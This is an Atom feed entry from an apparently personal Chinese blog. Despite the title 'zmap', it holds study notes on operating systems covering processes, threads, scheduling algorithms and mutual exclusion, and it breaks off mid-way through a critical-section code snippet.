<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>岁余的博客</title>
    <link href="http://example.com" />
    <updated>2023-07-15T06:48:00.000Z</updated>
    <entry>
        <id>http://example.com/2023/07/15/zmap/</id>
        <title>zmap</title>
        <link rel="alternate" href="http://example.com/2023/07/15/zmap/"/>
        <content type="html">&lt;h1 id=&#34;操作系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#操作系统&#34;&gt;#&lt;/a&gt; 操作系统&lt;/h1&gt;
&lt;h3 id=&#34;11_1-操作系统的概念-功能和目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_1-操作系统的概念-功能和目标&#34;&gt;#&lt;/a&gt; 1.1_1 操作系统的概念、功能和目标&lt;/h3&gt;
&lt;p&gt;作为用户和&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQUUlQTElRTclQUUlOTclRTYlOUMlQkElRTclQTElQUMlRTQlQkIlQjYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;计算机硬件&lt;/span&gt;之间的接口&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供的功能
&lt;ul&gt;
&lt;li&gt;命令接口（联机命令接口 | 脱机命令接口）&lt;/li&gt;
&lt;li&gt;程序接口&lt;/li&gt;
&lt;li&gt;GUI（图形用户界面 win|ios|andrio）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;目标
&lt;ul&gt;
&lt;li&gt;方便用户使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/ccdb31948c9e730f27c0b2a4ff899ec0.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;11_2-操作系统的特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_2-操作系统的特征&#34;&gt;#&lt;/a&gt; 1.1_2 操作系统的特征&lt;/h3&gt;
&lt;p&gt;并发 | 并行&lt;/p&gt;
&lt;p&gt;并发：多个事件交替发生（宏观同时发生、微观交替进行）&lt;br&gt;
并行：多个事件同时发生&lt;/p&gt;
&lt;p&gt;共享&lt;/p&gt;
&lt;p&gt;两种资源共享方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;互斥共享方式：一个时间段内只允许一个进程访问该资源&lt;/li&gt;
&lt;li&gt;同时共享方式：允许一个时间段内由多个进程 “同时” 对它们进行访问&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;并发和共享是多用户 os 的两个最基本的特征&lt;/p&gt;
&lt;p&gt;虚拟&lt;/p&gt;
&lt;p&gt;概念：把一个物理上的实体变为若干个逻辑上的对应物&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空分复用计数&lt;/li&gt;
&lt;li&gt;时分复用计数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;异步&lt;/p&gt;
&lt;p&gt;概念：在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停的，以不可预知的速度向前推进。只有系统拥有并发性，才有可能导致异步性。&lt;/p&gt;
&lt;h3 id=&#34;11_3-操作系统的发展与分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_3-操作系统的发展与分类&#34;&gt;#&lt;/a&gt; 1.1_3 操作系统的发展与分类&lt;/h3&gt;
&lt;p&gt;OS 的发展与分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手工操作阶段
&lt;ul&gt;
&lt;li&gt;纸带机（用户独占全机、人机速度矛盾）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;批处理阶段 ——dan’dao
&lt;ul&gt;
&lt;li&gt;单道批处理系统（外围机 —— 磁带）&lt;/li&gt;
&lt;li&gt;多道批处理系统（操作系统开始出现）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分时操作系统
&lt;ul&gt;
&lt;li&gt;轮流处理作业&lt;/li&gt;
&lt;li&gt;不能处理紧急任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;实时操作系统
&lt;ul&gt;
&lt;li&gt;优先处理紧急任务&lt;/li&gt;
&lt;li&gt;硬实时系统：必须在严格的时间内完成处理&lt;/li&gt;
&lt;li&gt;软实时系统：可以偶尔犯错&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网络操作系统&lt;/li&gt;
&lt;li&gt;分布式操作系统&lt;/li&gt;
&lt;li&gt;个人计算机操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11_4-操作系统的运行机制与体系结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_4-操作系统的运行机制与体系结构&#34;&gt;#&lt;/a&gt; 1.1_4 操作系统的运行机制与体系结构&lt;/h3&gt;
&lt;p&gt;OS 的运行机制和体系结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行机制
&lt;ul&gt;
&lt;li&gt;两种指令
&lt;ul&gt;
&lt;li&gt;特权指令&lt;/li&gt;
&lt;li&gt;非特权指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;两种处理器状态
&lt;ul&gt;
&lt;li&gt;核心态（root）&lt;/li&gt;
&lt;li&gt;用户态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;两种程序
&lt;ul&gt;
&lt;li&gt;内核程序 (运行在核心态)&lt;/li&gt;
&lt;li&gt;应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作系统内核
&lt;ul&gt;
&lt;li&gt;时钟管理（实现计时功能）&lt;/li&gt;
&lt;li&gt;中断处理&lt;/li&gt;
&lt;li&gt;原语（程序运行具有原子性，不可中断）&lt;/li&gt;
&lt;li&gt;对系统资源进行管理的功能
&lt;ul&gt;
&lt;li&gt;进程管理&lt;/li&gt;
&lt;li&gt;存储器管理&lt;/li&gt;
&lt;li&gt;设备管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作系统的体系结构
&lt;ul&gt;
&lt;li&gt;大内核（将操作系统的主要功能模块都作为系统内核，运行在核心态）&lt;/li&gt;
&lt;li&gt;微内核（只把最基本的功能保留在内核）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11_5-中断和异常&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_5-中断和异常&#34;&gt;#&lt;/a&gt; 1.1_5 中断和异常&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;中断机制的诞生
&lt;ul&gt;
&lt;li&gt;操作系统介入，开展管理工作&lt;/li&gt;
&lt;li&gt;“用户态 —&amp;gt; 核心态” 是通过中断实现的。并且中断是唯一途径&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;中断的概念和作用&lt;/li&gt;
&lt;li&gt;中断的分类
&lt;ul&gt;
&lt;li&gt;内中断（异常）
&lt;ul&gt;
&lt;li&gt;陷阱（trap）&lt;/li&gt;
&lt;li&gt;故障（fault）&lt;/li&gt;
&lt;li&gt;中止（abort）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;外中断 （CPU 外部）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;外中断的处理过程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11_6-系统调用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11_6-系统调用&#34;&gt;#&lt;/a&gt; 1.1_6 系统调用&lt;/h3&gt;
&lt;p&gt;概念：应用程序通过系统调用请求操作系统的服务。保证系统的稳定性和安全性。&lt;/p&gt;
&lt;p&gt;系统调用和库函数的区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统调用是操作系统向上层提供的接口&lt;/li&gt;
&lt;li&gt;有的库函数是对系统调用的进一步封装&lt;/li&gt;
&lt;li&gt;当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;21_1-进程的定义-组成-组织方式-特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_1-进程的定义-组成-组织方式-特征&#34;&gt;#&lt;/a&gt; 2.1_1 进程的定义、组成、组织方式、特征&lt;/h3&gt;
&lt;p&gt;定义：&lt;/p&gt;
&lt;p&gt;组成：PCB（进程存在唯一的标志），程序段，数据段&lt;/p&gt;
&lt;p&gt;组织方式：链接方式，指针指向不同的队列；索引方式，索引表&lt;/p&gt;
&lt;p&gt;特征：动态性、并发性、独立性、异步性、结构性&lt;/p&gt;
&lt;h3 id=&#34;21_2-进程的状态与转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_2-进程的状态与转换&#34;&gt;#&lt;/a&gt; 2.1_2 进程的状态与转换&lt;/h3&gt;
&lt;p&gt;状态：&lt;/p&gt;
&lt;p&gt;运行状态：占有 CPU，并在 CPU 上运行，单核只能一个进程（双核两个）（CPU√，其它资源√）&lt;/p&gt;
&lt;p&gt;就绪状态：已经具备运行条件，但是没有空闲的 CPU，暂时不能运行（CPUX，其它资源√）&lt;/p&gt;
&lt;p&gt;阻塞状态：等在某个事件的发生，暂时不能运行（CPUX，其它资源 X）&lt;/p&gt;
&lt;p&gt;创建状态：创建 PCB，程序段，数据段&lt;/p&gt;
&lt;p&gt;终止状态：回收内存，程序段，数据段，撤销 PCB&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkYlOUIlRTclQTglOEIlRTclOEElQjYlRTYlODAlODEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;进程状态&lt;/span&gt;间的转换 (图，且只能这样转化)&lt;/p&gt;
&lt;p&gt;创建态 -&amp;gt; 就绪态&lt;/p&gt;
&lt;p&gt;就绪态 -&amp;gt; 运行态&lt;/p&gt;
&lt;p&gt;运行态 -&amp;gt; 就绪态&lt;/p&gt;
&lt;p&gt;运行态 -&amp;gt; 中止态（比如数组越界）&lt;/p&gt;
&lt;p&gt;运行态 -&amp;gt; 阻塞态（主动）&lt;/p&gt;
&lt;p&gt;阻塞态 -&amp;gt; 就绪态（被动）&lt;/p&gt;
&lt;h3 id=&#34;21_3-进程控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_3-进程控制&#34;&gt;#&lt;/a&gt; 2.1_3 进程控制&lt;/h3&gt;
&lt;p&gt;基本概念：&lt;/p&gt;
&lt;p&gt;什么是进程控制？&lt;/p&gt;
&lt;p&gt;答：实现各种进程状态转换。&lt;/p&gt;
&lt;p&gt;如何实现进程控制？&lt;/p&gt;
&lt;p&gt;答：用 “原语” 实现。&lt;/p&gt;
&lt;p&gt;原语做的事情：&lt;/p&gt;
&lt;p&gt;1、更新 PCD 中的信息&lt;/p&gt;
&lt;p&gt;2、将 PCD 插入合适的队列&lt;/p&gt;
&lt;p&gt;3、分配 / 回收资源&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进程控制相关的原语：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、进程的创建：&lt;/p&gt;
&lt;p&gt;创建原语：申请空白 PCB、为新进程分配所需资源、初始化 PCB、将 PCB 插入就绪队列&lt;/p&gt;
&lt;p&gt;引起进程创建的事件：用户登录、作业调度、提供服务、应用请求&lt;/p&gt;
&lt;p&gt;2、进程的终止：&lt;/p&gt;
&lt;p&gt;撤销原语&lt;/p&gt;
&lt;p&gt;引起进程中止的事件：正常结束、异常结束、外界干预&lt;/p&gt;
&lt;p&gt;3、进程的阻塞：&lt;/p&gt;
&lt;p&gt;阻塞原语：运行态 -&amp;gt; 阻塞态&lt;/p&gt;
&lt;p&gt;引起进程阻塞的事件：需要等待系统分配某种资源、需要等待相互合作的其他进程完成工作&lt;/p&gt;
&lt;p&gt;4、进程的唤醒：&lt;/p&gt;
&lt;p&gt;唤醒原语：阻塞态 -&amp;gt; 就绪态&lt;/p&gt;
&lt;p&gt;引起进程唤醒的事件：等待的事件发生&lt;/p&gt;
&lt;p&gt;5、进程的切换&lt;/p&gt;
&lt;p&gt;切换原语&lt;/p&gt;
&lt;p&gt;引起进程切换的事件：当前进程事件片到、有更高优先级的进程到达、当前进程主动阻塞、当前进程终止&lt;/p&gt;
&lt;h3 id=&#34;21_4-进程通信&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_4-进程通信&#34;&gt;#&lt;/a&gt; 2.1_4 进程通信&lt;/h3&gt;
&lt;p&gt;1、共享存储 （分配共享空间，且互斥（P、V 操作）&lt;/p&gt;
&lt;p&gt;基于数据结构的共享：固定分配（低级）&lt;/p&gt;
&lt;p&gt;基于存储区的共享：划分存储区（高级）&lt;/p&gt;
&lt;p&gt;2、消息传递&lt;/p&gt;
&lt;p&gt;消息：消息头、消息体&lt;/p&gt;
&lt;p&gt;直接通信方式（直接挂载消息）&lt;/p&gt;
&lt;p&gt;间接通信方式（间接利用信箱发送消息）&lt;/p&gt;
&lt;p&gt;3、管道通信（pipe）&lt;/p&gt;
&lt;p&gt;只能半双工通信&lt;/p&gt;
&lt;p&gt;互斥（没写满，不能读，反之同理）&lt;/p&gt;
&lt;h3 id=&#34;21_5-线程概念和多线程模型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21_5-线程概念和多线程模型&#34;&gt;#&lt;/a&gt; 2.1_5 线程概念和多线程模型&lt;/h3&gt;
&lt;p&gt;什么是线程，为什么要引入线程？&lt;/p&gt;
&lt;p&gt;答：线程是一个基本的 CPU 执行单元，也是程序执行流的最小单位，进一步提高了系统的并发度&lt;/p&gt;
&lt;p&gt;引入线程机制后，有什么变化？&lt;/p&gt;
&lt;p&gt;资源分配、调度：进程是资源分配的基本单位，线程是调度的基本单位&lt;/p&gt;
&lt;p&gt;并发性：各线程间也能并发，提升了并发度&lt;/p&gt;
&lt;p&gt;系统开销：可以只在进程中切换，减小了 CPU 切换环境的系统开销&lt;/p&gt;
&lt;p&gt;1、线程有哪些重要的属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线程是处理机调度的基本单位&lt;/li&gt;
&lt;li&gt;多 CPU 计算机中，各个线程可占用不同的 CPU&lt;/li&gt;
&lt;li&gt;每个线程都有一个线程 ID、线程控制块（TCB）&lt;/li&gt;
&lt;li&gt;线程也有就绪、阻塞、运行三种基本状态&lt;/li&gt;
&lt;li&gt;线程几乎不拥有系统资源&lt;/li&gt;
&lt;li&gt;同一进程的不同线程间共享进程的资源&lt;/li&gt;
&lt;li&gt;由于共享内存地址空间，统一进程中的线程间通信甚至无需系统干预&lt;/li&gt;
&lt;li&gt;同一进程中的线程切换，不会引起进程切换&lt;/li&gt;
&lt;li&gt;不同进程中的线程切换，会引起进程切换&lt;/li&gt;
&lt;li&gt;切换同进程内的线程，系统开销很小&lt;/li&gt;
&lt;li&gt;切换进程，系统开销较大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、线程的实现方式&lt;/p&gt;
&lt;p&gt;用户级线程（ULT）：&lt;/p&gt;
&lt;p&gt;由应用管理，从用户的视角看能看到的线程&lt;/p&gt;
&lt;p&gt;内核级线程（KLT）：&lt;/p&gt;
&lt;p&gt;由操作系统管理，从操作系统内核视角看能看到的线程&lt;/p&gt;
&lt;p&gt;n 个 ULT 可以映射到 m 个 KLT 上（n&amp;gt;=m）&lt;/p&gt;
&lt;p&gt;内核级线程才是处理机分配的单位&lt;/p&gt;
&lt;p&gt;3、多线程模型&lt;/p&gt;
&lt;p&gt;多对一模型&lt;/p&gt;
&lt;p&gt;n 个 ULT 映射到 1 个 KLT&lt;/p&gt;
&lt;p&gt;优点：开销小，效率高&lt;/p&gt;
&lt;p&gt;缺点： 容易阻塞，并发度不高&lt;/p&gt;
&lt;p&gt;一对一模型&lt;/p&gt;
&lt;p&gt;n 个 ULT 映射到 n 个 KLT&lt;/p&gt;
&lt;p&gt;优点：并发能力很强&lt;/p&gt;
&lt;p&gt;缺点：占用成本高，开销大&lt;/p&gt;
&lt;p&gt;多对多模型&lt;/p&gt;
&lt;p&gt;n 个 ULT 映射到 m 个 KLT 上（n&amp;gt;=m）&lt;/p&gt;
&lt;p&gt;中和以上两种优缺点&lt;/p&gt;
&lt;h3 id=&#34;22_1-处理机调度的概念-层次&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_1-处理机调度的概念-层次&#34;&gt;#&lt;/a&gt; 2.2_1 处理机调度的概念、层次&lt;/h3&gt;
&lt;p&gt;基本概念&lt;/p&gt;
&lt;p&gt;通常进程数量大于处理机数量，所以要按照一定的算法选择一个进程，并将处理机分配给它运行，以实现进程的并发执行&lt;/p&gt;
&lt;p&gt;三个层次&lt;/p&gt;
&lt;p&gt;高级调度（作业调度）&lt;/p&gt;
&lt;p&gt;辅助外存与内存之间的调度，作业调入时会建立相应的 PCB，作业调出时才撤销 PCB，调入可由操作系统决定，调出由作业运行结束才调出&lt;/p&gt;
&lt;p&gt;中级调度（内存调度）&lt;/p&gt;
&lt;p&gt;将暂时不用的进程放到外存（PCB 不外放），提高内存利用率和系统吞吐量，进程状态为挂起状态，形成挂起队列&lt;/p&gt;
&lt;p&gt;低级调度（进程调度）&lt;/p&gt;
&lt;p&gt;最基本，用算法为进程分配处理机资源，几十 ms 一次&lt;/p&gt;
&lt;p&gt;三层调度的联系、对比&lt;/p&gt;
&lt;p&gt;进程的 “挂起态”&lt;/p&gt;
&lt;p&gt;七状态模型&lt;/p&gt;
&lt;p&gt;五状态前面学了，挂起分为就绪挂起、阻塞挂起&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/6ea9441c9d17d1d23c2ce2d000f7658b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;22_2-进程调度的时机-切换与过程调度方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_2-进程调度的时机-切换与过程调度方式&#34;&gt;#&lt;/a&gt; 2.2_2 进程调度的时机、切换与过程调度方式&lt;/h3&gt;
&lt;p&gt;1、时机&lt;/p&gt;
&lt;p&gt;什么时候需要进程调度？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主动放弃（进程正常终止、运行过程中发生异常而终止、进程主动请求阻塞）&lt;/li&gt;
&lt;li&gt;被动放弃（分给进程的时间片用完、有更紧急的事需要处理、有更高优先级的进程进入就绪队列）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;什么时候不能进行进程调度？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在处理中断的过程中&lt;/li&gt;
&lt;li&gt;在操作系统内核程序临界区中
&lt;ul&gt;
&lt;li&gt;临界资源：一个时段段内各进程互斥地访问临界资源&lt;/li&gt;
&lt;li&gt;临界区：访问临界资源的那段代码&lt;/li&gt;
&lt;li&gt;内核程序临界区会访问就绪队列，导致其上锁&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在原子操作过程中（原语）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、切换与过程&lt;/p&gt;
&lt;p&gt;“狭义的调度” 与 “进程切换” 的区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;狭义：选择一个进程&lt;/li&gt;
&lt;li&gt;广义：狭义 + 进程切换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进程切换的过程需要做什么？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对原来运行进程各种数据的保存&lt;/li&gt;
&lt;li&gt;对新的进程各种数据的恢复&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、方式&lt;/p&gt;
&lt;p&gt;非剥夺调度方式（非抢占式）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只允许进程主动放弃处理机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;剥夺调度方式（抢占式）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进程被动放弃，可以优先处理紧急任务，适合分时操作系统、实时操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;22_3-调度算法的评价指标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_3-调度算法的评价指标&#34;&gt;#&lt;/a&gt; 2.2_3 调度算法的评价指标&lt;/h3&gt;
&lt;p&gt;1、CPU 利用率&lt;/p&gt;
&lt;p&gt;CPU 利用率 = CPU 忙碌的时间 / 总时间&lt;/p&gt;
&lt;p&gt;2、系统吞吐量&lt;/p&gt;
&lt;p&gt;= 总共完成了多少道作业 / 总共画了多少时间&lt;/p&gt;
&lt;p&gt;3、周转时间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;周转时间（提交作业到完成作业花费的时间）、平均周转时间（各作业周转时间之和 / 作业数）&lt;/li&gt;
&lt;li&gt;带权周转时间（作业周转时间 / 作业实际运行的时间）、平均带权周转时间（各作业带权周转时间 / 作业数）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4、等待时间&lt;/p&gt;
&lt;p&gt;进程或作业等待处理机状态时间的和&lt;/p&gt;
&lt;p&gt;进程：等待被服务的时间之和&lt;/p&gt;
&lt;p&gt;作业：建立后的等待时间 + 作业在外存后备队列中等待的时间&lt;/p&gt;
&lt;p&gt;5、响应时间&lt;/p&gt;
&lt;p&gt;从用户提交请求到首次产生响应所用的时间&lt;/p&gt;
&lt;h3 id=&#34;22_4-fcfs-sjf-hrrn调度算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_4-fcfs-sjf-hrrn调度算法&#34;&gt;#&lt;/a&gt; 2.2_4 FCFS、SJF、HRRN 调度算法&lt;/h3&gt;
&lt;p&gt;1、先来先服务（FCFS）&lt;/p&gt;
&lt;p&gt;先到达先进行服务&lt;/p&gt;
&lt;p&gt;作业 - 后备队列；进程 - 就绪队列&lt;/p&gt;
&lt;p&gt;非抢占式&lt;/p&gt;
&lt;p&gt;公平、算法简单&lt;/p&gt;
&lt;p&gt;对长作业有利、对短作业不利、不会饥饿&lt;/p&gt;
&lt;p&gt;2、短作业优先（SJF，shortest job first）&lt;/p&gt;
&lt;p&gt;最短（服务时间最短）的作业优先得到服务，时间相同，先到达的先被服务&lt;/p&gt;
&lt;p&gt;非抢占式（SJF）：选最短需要时间的作业先进入运行态&lt;/p&gt;
&lt;p&gt;抢占式（SRTN）：有新作业进入就绪队列或有作业完成了，考察队列中的最小需要时间的作业&lt;/p&gt;
&lt;p&gt;在所有进程都几乎同时到达时，采用 SJP 调度算法的平均等待时间、平均周转时间最少&lt;/p&gt;
&lt;p&gt;若无红色前提，抢占式的短作业 / 进程的平均时间最少&lt;/p&gt;
&lt;p&gt;优点：“最短的” 平均等待时间，平均周转时间&lt;/p&gt;
&lt;p&gt;缺点：对短作业有利，对长作业不利，可能产生饥饿现象&lt;/p&gt;
&lt;p&gt;3、高响应比优先（HRRN）&lt;/p&gt;
&lt;p&gt;要综合考虑作业 / 进程的等待时间和要求服务的时间&lt;/p&gt;
&lt;p&gt;在每次调度时先计算各个作业 / 进程的响应比，选择响应比最高的作业 / 进程为其服务&lt;/p&gt;
&lt;p&gt;响应比 =（等待时间 + 要求服务时间）/ 要求服务时间&lt;/p&gt;
&lt;p&gt;非抢占式&lt;/p&gt;
&lt;p&gt;进程主动放弃 CPU 时，需要该算法选取就绪队列的作业&lt;/p&gt;
&lt;p&gt;不会饥饿&lt;/p&gt;
&lt;h3 id=&#34;22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统&#34;&gt;#&lt;/a&gt; 2.2_5 时间片轮转、优先级调度、多级反馈队列（适合交互式系统）&lt;/h3&gt;
&lt;p&gt;1、时间片轮转算法（RR）&lt;/p&gt;
&lt;p&gt;算法思想：公平轮流地位各个进程服务，让每个进程在一定时间间隔内都可以得到响应&lt;/p&gt;
&lt;p&gt;算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片（如 100ms）。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列对位重新排队。&lt;/p&gt;
&lt;p&gt;只能用于进程调度&lt;/p&gt;
&lt;p&gt;抢占式&lt;/p&gt;
&lt;p&gt;优点：响应块，适用于分时操作系统&lt;/p&gt;
&lt;p&gt;缺点：由于高频率的进程切换，因此有一定的开销；不区分任务的紧急程度&lt;/p&gt;
&lt;p&gt;不会饥饿&lt;/p&gt;
&lt;p&gt;2、优先级调度算法&lt;/p&gt;
&lt;p&gt;算法思想：根据任务的紧急程度来决定处理顺序&lt;/p&gt;
&lt;p&gt;算法规则：每个进程 / 作业有各自的优先级，调度时选择优先级最高的作业 / 进程&lt;/p&gt;
&lt;p&gt;适用：作业 / 进程 / IO&lt;/p&gt;
&lt;p&gt;抢占式 / 不可抢占均有&lt;/p&gt;
&lt;p&gt;静态优先级：不变&lt;/p&gt;
&lt;p&gt;动态优先级：可以变&lt;/p&gt;
&lt;p&gt;通常：系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好 I/O 进程&lt;/p&gt;
&lt;p&gt;可以从追求公平、提升资源利用率等角度考虑改变优先级&lt;/p&gt;
&lt;p&gt;可能会饥饿&lt;/p&gt;
&lt;p&gt;3、多级反馈队列调度算法&lt;/p&gt;
&lt;p&gt;算法思想：对其它算法调度的这种权衡&lt;/p&gt;
&lt;p&gt;算法实现：设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第一级队列，按照 FCFS 原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列对位。如果此时已经在最下级的队列，则重新放回最下级队列末尾。啊只有第 K 级队头的进程为空时，才会为 K+1 级对头的进程分配时间片，被抢占处理机的进程重新放回原队列队尾。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/e3511c2bee7ff94bf8fe9c0fae2806eb.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;优点：对各个进程相对公平（FCFS 的优点），每个新到达的进程都可以很快就得到响应（RR 的优点）；短进程只用较少的时间就可以完成（SPF 的优点）；不必实现估计进程的运行时间（避免用户作假）；可灵活地调整对各类进程的偏好程度，比如 CPU 密集型进程、IO 密集型进程&lt;/p&gt;
&lt;p&gt;默认抢占式&lt;/p&gt;
&lt;p&gt;会饥饿&lt;/p&gt;
&lt;h3 id=&#34;23_1-进程同步-进程互斥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_1-进程同步-进程互斥&#34;&gt;#&lt;/a&gt; 2.3_1 进程同步、进程互斥&lt;/h3&gt;
&lt;p&gt;1、进程同步&lt;/p&gt;
&lt;p&gt;指为了完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调他们的工作次序而产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。&lt;/p&gt;
&lt;p&gt;2、进程互斥&lt;/p&gt;
&lt;p&gt;把一个时间段内只允许一个进程使用的资源称为临界资源。&lt;/p&gt;
&lt;p&gt;对临界资源的互斥访问，可以在逻辑上分为四个部分：&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    entry section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 进入区     对访问的资源检查或进行上锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 临界区 (段) 访问临界资源的那部分代码&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    exit section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 退出区     负责解锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 剩余区     